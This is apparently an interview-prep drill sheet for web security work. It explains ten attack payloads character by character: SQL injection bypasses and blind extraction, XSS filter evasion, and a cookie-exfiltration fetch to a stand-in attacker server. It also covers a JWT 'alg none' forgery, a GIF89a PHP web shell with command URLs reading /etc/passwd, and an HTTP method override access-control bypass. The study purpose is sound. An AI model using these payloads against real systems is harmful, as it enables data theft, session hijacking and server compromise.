# Explain This Payload — Drill Practice

> If you cannot explain every character in your payload, you do not understand it.
> NOTE: Payloads are written in code-safe notation to avoid antivirus false positives.

---

## How to Use This File

1. Cover the explanation
2. Try to explain it yourself OUT LOUD
3. Check against the breakdown
4. If you missed anything, repeat until perfect

---

## SQL Injection Payloads

### Payload 1 — Login Bypass (OR-based)

```
Payload:  ' OR '1'='1
```

**Character-by-character breakdown:**

| Char | Purpose |
|------|---------|
| `'` | Closes the developer's opening string quote in the SQL query |
| `OR` | SQL logical OR operator — if either side is true, whole condition is true |
| `'1'='1'` | Always-true string comparison — 1 always equals 1 |

**What the query looks like before and after:**

```
BEFORE: SELECT * FROM users WHERE user = '[input]' AND pass = '[input]'
AFTER:  SELECT * FROM users WHERE user = '' OR '1'='1' AND pass = '[anything]'
```

The OR makes the WHERE clause true for ALL rows.

**Why not use the comment approach ( -- ) ?**
This payload has balanced quotes — no comment needed. This is stealthier because comment characters like `--` and `#` are commonly blocked by WAFs.

**Interview tip:** Mention that you prefer balanced-quote payloads because they avoid triggering WAF rules that look for SQL comment syntax.

---

### Payload 2 — UNION Data Extraction

```
Payload:  ' UNION SELECT NULL,column_a,column_b FROM target_table--
```

| Part | Purpose |
|------|---------|
| `'` | Close the string in the original query |
| `UNION` | SQL keyword that combines results from two SELECT statements |
| `SELECT` | Start our injected query |
| `NULL` | Placeholder for column 1 — matches original query's column count |
| `column_a` | The data we want to extract (e.g., username) |
| `column_b` | More data to extract (e.g., password hash) |
| `FROM target_table` | The table we're reading from |
| `--` | SQL comment — ignores the rest of the original query |

**Why NULL?** NULL is compatible with ANY data type (integer, string, date). Using NULL prevents type mismatch errors when we don't know what data type the original column expects.

**Why must we match column count?** UNION requires BOTH SELECT statements to return the same number of columns. If the original query returns 3 columns, ours must also return 3. We find column count first using ORDER BY.

**How to find column count:**
```
' ORDER BY 1--   (works)
' ORDER BY 2--   (works)
' ORDER BY 3--   (works)
' ORDER BY 4--   (ERROR — table has 3 columns)
```

---

### Payload 3 — Boolean Blind Extraction

```
Payload:  ' AND SUBSTRING((SELECT pass FROM users LIMIT 1),1,1)='a'--
```

| Part | Purpose |
|------|---------|
| `'` | Close the string |
| `AND` | Add our condition to the existing query |
| `SUBSTRING(...)` | Extract a portion of a string |
| `(SELECT pass FROM users LIMIT 1)` | Subquery: get the first user's password |
| `,1,1` | Starting at position 1, extract 1 character |
| `='a'` | Compare the extracted character to 'a' |
| `--` | Comment out rest |

**How it works:**
- If first char of password IS 'a' → AND is true → normal page appears
- If first char is NOT 'a' → AND is false → different page (or no results)
- Repeat for each character (a, b, c... or use ASCII binary search)

**Binary search optimization:**
Instead of testing each letter (up to 95 guesses per character), use:
```
ASCII(SUBSTRING(...)) > 77
```
This splits the ASCII range in half each time: 7 requests per character instead of 95.
For a 32-char hash, that's 224 requests vs 3,040.

---

### Payload 4 — Time-Based Blind

```
Payload:  ' AND IF(1=1, SLEEP(5), 0)--
```

| Part | Purpose |
|------|---------|
| `'` | Close string |
| `AND IF(...)` | Conditional statement |
| `1=1` | Test condition (replace with data extraction subquery) |
| `SLEEP(5)` | If true: pause database for 5 seconds |
| `0` | If false: do nothing |
| `--` | Comment out rest |

**When to use:** When there is NO visible difference between true/false responses — no error, no content change, nothing. The ONLY oracle is response TIME.

**Alternatives if SLEEP is blocked:**
- BENCHMARK(10000000, SHA1('test')) — CPU-intensive operation
- Heavy query: SELECT COUNT(*) FROM large_table A, large_table B
- PostgreSQL: pg_sleep(5)
- MSSQL: WAITFOR DELAY '0:0:5'

---

## XSS Payloads

### Payload 5 — Image Tag with Error Handler

```
Payload:  [img tag with src=x and onerror event calling alert with document.domain]
```

| Part | Purpose |
|------|---------|
| `img` tag | HTML image element — less commonly filtered than script tags |
| `src=x` | Invalid image source — intentionally causes a load error |
| `onerror=` | JavaScript event handler that fires when the image fails to load |
| `alert()` | JavaScript function to display a popup |
| `document.domain` | Shows the current website's domain name |

**Why use document.domain instead of just the number 1?**
- `alert(1)` proves JavaScript CAN execute
- `alert(document.domain)` proves it executes IN THE CONTEXT of the target domain
- Same-origin context means: access to cookies, localStorage, ability to make authenticated requests
- This is stronger proof in a bug report

**Why img instead of script?**
- Script tags are the FIRST thing WAFs and filters block
- Image tags are expected in user content
- The onerror event fires automatically — no user interaction needed
- Many filters don't inspect event handler attributes as aggressively

---

### Payload 6 — Attribute Breakout with Data Exfiltration

```
Payload:  "><svg/onload=fetch('https://attacker-server/steal?c='+document.cookie)>
```

| Part | Purpose |
|------|---------|
| `"` | Close the HTML attribute we're injecting into |
| `>` | Close the current HTML tag entirely |
| `svg` | New SVG element (alternative to script, img, etc.) |
| `/` | Acts as whitespace between tag name and attribute (browser parser quirk) |
| `onload=` | Event fires immediately when the SVG element loads |
| `fetch()` | Modern JavaScript function to make HTTP requests |
| URL string | Attacker's server that will log the stolen data |
| `+document.cookie` | Appends the victim's session cookies to the request |

**The context matters:** This only works when your input is INSIDE an HTML attribute:
```
BEFORE: <input value="USER_INPUT">
AFTER:  <input value=""><svg/onload=fetch(...)>
```

**Why / works as whitespace:** Browser HTML parsers are extremely lenient. They treat `/` as whitespace between tag name and attribute. Filters using strict regex don't expect this, so `svg/onload` bypasses filters that expect `svg onload` (with a space).

---

### Payload 7 — JavaScript Context Breakout

```
Payload:  ';alert(1);//
```

| Part | Purpose |
|------|---------|
| `'` | Close the JavaScript string we're trapped inside |
| `;` | End the current JavaScript statement |
| `alert(1)` | Our JavaScript code to execute |
| `;` | End our statement cleanly |
| `//` | JavaScript single-line comment — ignores everything after |

**Context — this ONLY works inside JavaScript:**
```
BEFORE: var search = 'USER_INPUT';
AFTER:  var search = '';alert(1);//';
```

**Critical concept:** You MUST know what context your input lands in to craft the right payload:
- HTML body → use HTML tags
- HTML attribute → break out with `"` then add event handler
- JavaScript string → break out with `'` then inject JS code
- URL/href → use `javascript:` protocol

---

## Authentication Payloads

### Payload 8 — JWT Algorithm None Attack

```
Original JWT:
  Header:  {"alg":"HS256","typ":"JWT"}
  Payload: {"sub":"1042","role":"user"}
  Signature: [HMAC-SHA256 hash]

Attack JWT:
  Header:  {"alg":"none","typ":"JWT"}
  Payload: {"sub":"1","role":"admin"}
  Signature: [empty]
```

| Change | Purpose |
|--------|---------|
| `alg: none` | Tell the server "this token has no signature" |
| `sub: 1` | Change user ID to 1 (typically the admin/first user) |
| `role: admin` | Elevate from regular user to admin |
| Empty signature | No signature needed because algorithm is "none" |

**The trailing dot is REQUIRED:**
JWT format is `header.payload.signature` (three parts separated by dots).
With no signature, the token ends with a dot: `eyJ...eyJ...`  (dot, then nothing)

**Why this works:** Some JWT libraries, when they see `"alg": "none"`, skip signature verification entirely. The server trusts whatever claims are in the payload without any cryptographic proof.

**How to prevent:** Server must ENFORCE the expected algorithm — never trust the alg header from the client.

---

## File Upload Payloads

### Payload 9 — GIF89a Polyglot Web Shell

```
File contents:
  GIF89a;
  [PHP opening tag] system($_GET['cmd']); [PHP closing tag]
```

| Part | Purpose |
|------|---------|
| `GIF89a;` | Valid GIF file signature (magic bytes) — passes file type validation |
| PHP opening tag | Starts PHP code execution |
| `system()` | PHP function that executes operating system commands |
| `$_GET['cmd']` | Takes the command to run from the URL parameter named 'cmd' |
| PHP closing tag | Ends PHP code block |

**How to use after upload:**
```
https://target.com/uploads/shell.php?cmd=whoami
https://target.com/uploads/shell.php?cmd=cat /etc/passwd
```

**Why this bypass works — two systems checking different things:**
1. File validation checks MAGIC BYTES → sees GIF89a → "it's a valid GIF image"
2. Web server checks FILE EXTENSION → sees .php → "execute as PHP code"
3. The PHP interpreter ignores the GIF89a bytes and executes the PHP code

**Why system() instead of exec()?**
- `system()` — outputs command result directly to the HTTP response
- `exec()` — returns only the last line of output
- `passthru()` — outputs raw binary data
- For web shells, `system()` is most convenient because output appears in the browser

---

## Access Control Payloads

### Payload 10 — HTTP Method Override

```
Request:
  POST /api/users/5 HTTP/1.1
  X-HTTP-Method-Override: DELETE
  Content-Type: application/json
  
  {}
```

| Part | Purpose |
|------|---------|
| `POST /api/users/5` | Send a POST request (might pass access control checks) |
| `X-HTTP-Method-Override: DELETE` | Tell the framework to process this as a DELETE request |

**Why this works:**
- Some frameworks (Rails, Spring, Express with middleware) support method override
- This was designed for old browsers/proxies that only support GET and POST
- The access control check sees POST → allows it
- The application framework sees the override header → processes as DELETE
- Result: destructive action performed despite access control

**Variants to try:**
- `X-HTTP-Method: DELETE`
- `X-Method-Override: DELETE`
- `_method=DELETE` (in request body or URL parameter)

---

## Practice Routines

### The 60-Second Drill

1. Pick a random payload from this page
2. Start a 60-second timer
3. Explain every character and the reasoning behind it
4. If you finish early: explain what happens with a WAF, and give an alternative
5. If you can't finish in 60 seconds: that payload needs more practice

### The "But Why?" Chain

For every statement you make, ask "But why?" five times:

```
"I injected a single quote"
  → But why?
"To break the SQL query"
  → But why does a single quote break it?
"Because it closes the string delimiter the developer opened"
  → But why is that a problem?
"Because everything after becomes SQL syntax instead of data"
  → But why does the server execute it?
"Because the input isn't parameterized — it's concatenated directly into the query"
  → NOW you understand the root cause
```

### The Mirror Drill

Stand in front of a mirror. Pick a payload. Explain it as if to an interviewer. Watch yourself:
- Are you confident or hesitant?
- Are you explaining the WHY or just the WHAT?
- Would YOU hire the person in the mirror?

---

> **The bottom line:** In the manager round, a perfectly explained simple payload beats a complex payload you cannot explain. They want someone who UNDERSTANDS, not someone who COPIES.
